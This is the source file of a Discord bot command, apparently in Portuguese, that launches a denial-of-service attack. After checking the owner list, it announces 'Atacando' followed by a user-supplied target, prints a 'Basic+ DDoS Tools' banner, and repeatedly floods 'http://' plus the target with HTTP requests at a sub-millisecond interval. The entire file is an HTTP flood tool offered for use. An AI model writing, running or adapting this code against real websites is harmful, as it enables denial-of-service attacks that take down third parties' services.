const Discord = require('discord.js')
const figlet = require('figlet')
const colors = require('colors')

module.exports.run = async(client, message, args) => {
const { dono } = require("../config.json");
if (!dono.includes(message.author.id)) return message.send("");
    message.delete()
            
            
    let sayEmbed = new Discord.RichEmbed()
    .setColor("#FF4400")
                        
    .setTitle('Atacando' + "`" + args.join(" ") + "`")
                       
                        
            
     message.channel.send(sayEmbed)
            
                const request = require('requests');
            
            
            
            const interval = 32768;
            
            
            
            console.log('==========================================================================================');
                           
             console.log(figlet.textSync('Basic+\nDDoS Tools', 'trek'));
                        
            console.log('==========================================================================================');
                     
            var target = args.join(" ")
            
                var cible = "http://" + target
            
            
            
            packet = function () {
                
                    code = "H"
                return code;
            }
            
            sendrequest = function (code) {
                request(cible , (error) => {
                    if(error){
                           
                       
                        
            // logger.error(error);
                
            
                            
                        return;
                    }
             
                      
                    })}
            
            
            
            
            
            
            
            var count = 1
            sendrequest(packet());
            setInterval(() => {
            //while (count < packetnumber) {
            
                sendrequest(packet());
                count++
                console.log(`[PACKET SENT] = ` + count) ;
            //}
            }, (1/interval) * 1000);
}
